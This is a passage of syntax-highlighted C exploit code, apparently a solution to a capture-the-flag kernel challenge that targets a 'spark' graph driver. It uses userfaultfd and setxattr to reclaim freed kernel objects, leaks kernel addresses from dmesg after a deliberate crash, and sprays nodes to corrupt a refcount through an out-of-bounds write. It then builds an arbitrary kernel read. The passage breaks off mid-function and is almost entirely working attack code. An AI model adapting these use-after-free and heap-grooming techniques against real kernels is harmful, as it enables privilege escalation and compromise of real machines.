class="hljs-keyword">long</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_size;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> g_create_next_id;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">create</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(DEV_PATH, O_RDONLY);<br>    assert(fd != <span class="hljs-number">-1</span>);<br>    g_create_next_id++;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">llink</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_LINK, b | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = a,<br>        .fd2 = b,<br>    &#125;;<br>    assert(ioctl(a, SPARK_QUERY, &amp;qry) == <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> qry.distance;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_FINALIZE) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, struct spark_info *info)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_INFO, info) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">release</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(close(a) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">sem_t</span> fault_sem;<br>    <span class="hljs-keyword">sem_t</span> unblock_sem;<br>    <span class="hljs-keyword">void</span> *addr;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">fault_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> *<span class="hljs-title">param</span> =</span> (struct fault_arg *)arg;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *page = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(page != MAP_FAILED);<br>    page[<span class="hljs-number">0</span>] = <span class="hljs-number">0xff</span>; <span class="hljs-comment">// top byte for traversal addr</span><br><br>    <span class="hljs-comment">// create a userfaultfd object</span><br>    <span class="hljs-keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    assert(uffd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-comment">// enable the userfaultfd object</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// n_addr is the start of where you want to catch the pagefault. In our</span><br>    <span class="hljs-comment">// case, we set it to the address of page 2</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)param-&gt;addr;<br>    uffdio_register.range.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    assert(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">0</span>);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-keyword">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    assert(nready != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    assert(read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg)) == <span class="hljs-keyword">sizeof</span>(msg));<br>    assert(msg.event == UFFD_EVENT_PAGEFAULT);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// wait until reclaim_free is called. but in stage1 it doesn&#x27;t exist.</span><br>    assert(sem_wait(&amp;param-&gt;unblock_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)page;<br>    uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)msg.arg.pagefault.address &amp; ~<span class="hljs-number">0xfff</span>UL;<br>    uffdio_copy.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">0</span>);<br><br>    close(uffd);<br>    munmap(page, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">setxattr_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> *<span class="hljs-title">param</span> =</span> (struct setxattr_arg *)arg;<br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, param-&gt;buf, param-&gt;size, XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> <span class="hljs-title">fault_arg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> <span class="hljs-title">setxattr_arg</span>;</span><br>    <span class="hljs-keyword">pthread_t</span> setxattr_handle;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc_raw</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">char</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *mem = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(mem != MAP_FAILED);<br><br>    ctx-&gt;fault_arg.addr = mem + <span class="hljs-number">0x1000</span>;<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.fault_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.unblock_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">pthread_t</span> handle;<br>    assert(pthread_create(&amp;handle, <span class="hljs-literal">NULL</span>, fault_thread, &amp;ctx-&gt;fault_arg) == <span class="hljs-number">0</span>);<br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">char</span> *node = mem + <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x7e</span>;<br>    <span class="hljs-comment">// memcpy could cross boundaries</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x7e</span>; i++)<br>        node[i] = buf[i];<br><br>    ctx-&gt;setxattr_arg.buf = node;<br>    ctx-&gt;setxattr_arg.size = <span class="hljs-number">0x7f</span>; <span class="hljs-comment">// avoid copy_from_user 16b optimization</span><br>    assert(pthread_create(&amp;ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>, setxattr_thread, &amp;ctx-&gt;setxattr_arg) == <span class="hljs-number">0</span>);<br><br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_finalized,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;               <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = is_finalized;   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x58</span>) = num_children;  <span class="hljs-comment">// num_children</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x70</span>) = traversal_idx; <span class="hljs-comment">// traversal_idx</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = traversal;     <span class="hljs-comment">// traversal</span><br><br>    reclaim_alloc_raw(ctx, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_free</span><span class="hljs-params">(struct reclaim_ctx *ctx)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(sem_post(&amp;ctx-&gt;fault_arg.unblock_sem) == <span class="hljs-number">0</span>);<br>    assert(pthread_join(ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1_leak_dmesg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *edges_addrp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br><br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br><br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr = <span class="hljs-number">0</span>, edges_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!dist_addr || !edges_addr); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!dist_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RAX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;dist_addr) != <span class="hljs-number">1</span>)<br>                dist_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!edges_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;R09: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;edges_addr) != <span class="hljs-number">1</span>)<br>                edges_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(dist_addr &amp;&amp; edges_addr);<br><br>    <span class="hljs-built_in">free</span>(buf);<br><br>    *dist_addrp = dist_addr;<br>    *edges_addrp = edges_addr;<br>&#125;<br><br><span class="hljs-comment">// resulting size should be in a rarely used cache</span><br><span class="hljs-comment">// this is supposed to be arbitrary but if you change it you&#x27;ll mess up stage 3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S1_DIST_NUM_NODES 12</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *node_addrp, <span class="hljs-keyword">int</span> *node_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Freeing node\n&quot;</span>);<br>    release(fds[S1_DIST_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">//*the crashed process will stop execute, so create a new thread here.</span><br>    <span class="hljs-keyword">pid_t</span> pid = fork();<br>    assert(pid != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//*chlid process</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Reclaiming node\n&quot;</span>);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">ctx</span>;</span><br>        <span class="hljs-comment">//*finalized the last node, avoid the revise of the next finalize</span><br>        reclaim_alloc(&amp;ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x4141000000000000</span>UL, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Finalizing root\n&quot;</span>);<br>        finalize(fds[<span class="hljs-number">0</span>]);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Performing crash query by UAF\n&quot;</span>);<br>        query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// Will never get here</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    usleep(<span class="hljs-number">250</span> * <span class="hljs-number">1000</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Leaking from dmesg\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr, edges_addr;<br>    stage1_leak_dmesg(&amp;dist_addr, &amp;edges_addr);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> node_addr = edges_addr - <span class="hljs-number">0x60</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Dist @ 0x%lx\n&quot;</span>, dist_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Node @ 0x%lx\n&quot;</span>, node_addr);<br><br>    *dist_addrp = dist_addr;<br>    *node_addrp = node_addr;<br>    *node_fdp = fds[<span class="hljs-number">0</span>];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE1_NUM_NODES</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2_spray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd, <span class="hljs-keyword">int</span> before, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> skip, <span class="hljs-keyword">int</span> after)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; before; i++)<br>        create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        fd[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i += skip)<br>    &#123;<br>        release(fd[i]);<br>        fd[i] = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; after; i++)<br>        create();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2</span><span class="hljs-params">(struct reclaim_ctx *victim_ctx, <span class="hljs-keyword">int</span> *victim_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//*errrrrrr, dist array size will be 8b less than STAGE2_NUM_NODES*8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_NUM_NODES 17 <span class="hljs-comment">// dist array size == 0x80 == sizeof node</span></span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[STAGE2_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>); <span class="hljs-comment">// 1 will be written at traversal_idx</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing node\n&quot;</span>);<br>    release(fds[STAGE2_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming node\n&quot;</span>);<br>    <span class="hljs-comment">//*the idx is 17</span><br>    reclaim_alloc(victim_ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) / <span class="hljs-number">8</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// target: sprayed refcount</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Finalizing root\n&quot;</span>);<br>    <span class="hljs-comment">//*now fds[0] have children in different traversals. the last and the others.</span><br>    finalize(fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating predecessor\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_incref_fd = create();<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_SPRAY_NUM 200</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Spraying nodes\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_fd[STAGE2_SPRAY_NUM];<br>    stage2_spray(spray_fd, <span class="hljs-number">30</span>, STAGE2_SPRAY_NUM, <span class="hljs-number">4</span>, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Incrementing sprayed refcounts\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>            llink(spray_incref_fd, spray_fd[i], <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//*above ops create gaps in size of struct_node for dis_arr</span><br>    <span class="hljs-comment">//*next line there is nothing special</span><br>    finalize(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Corrupting refcount\n&quot;</span>);<br>    <span class="hljs-comment">//*use the OOB to corrupt the dis_arr&#x27;s adjacent node struct.</span><br>    query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*release the root, but only the node whose refcount has been modified will be freed</span><br>    <span class="hljs-comment">//*and all fds except for root retain the same as before.</span><br>    release(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming victim node\n&quot;</span>);<br>    reclaim_free(victim_ctx); <span class="hljs-comment">// unblock fault</span><br>                              <span class="hljs-comment">// ephemeral alloc to put two 0xff at the end for traversal top bytes</span><br>                              <span class="hljs-comment">//*these two bytes are in next uffd page</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>] = <span class="hljs-number">0xff</span>;<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">2</span>] = <span class="hljs-number">0xff</span>;<br>    <span class="hljs-comment">//*now there are serveral gaps in size of node_t, which one will be chosed?</span><br>    <span class="hljs-comment">//*good luck. at least the following two lines will use the same chunk.</span><br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, buf, <span class="hljs-keyword">sizeof</span>(buf), XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    reclaim_alloc(victim_ctx, <span class="hljs-number">0</span>, <span class="hljs-number">1337</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Searching for victim node(fd)\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> victim_fd = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span> =</span> &#123;<br>                .num_children = <span class="hljs-number">0</span>,<br>            &#125;;<br>            get_info(spray_fd[i], &amp;info);<br>            <span class="hljs-keyword">if</span> (info.num_children == <span class="hljs-number">1337</span>)<br>            &#123;<br>                victim_fd = spray_fd[i];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//*indeed, this totally depends on luck...</span><br>    assert(victim_fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Victim fd = %d\n&quot;</span>, victim_fd);<br>    *victim_fdp = victim_fd;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_NUM_NODES</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE3_READ_NUM_CHILDREN 0x4142133703030303</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">stage3_read</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    reclaim_free(ctx);<br>    <span class="hljs-comment">// during read, we keep a special num_children so we can find ourselves</span><br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, STAGE3_READ_NUM_CHILDREN, <span class="hljs-number">0</span>, addr);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span>;</span><br>    get_info(fd, &amp;info);<br>    <span class="hljs-keyword">return</span> info.traversal_size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage3</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, 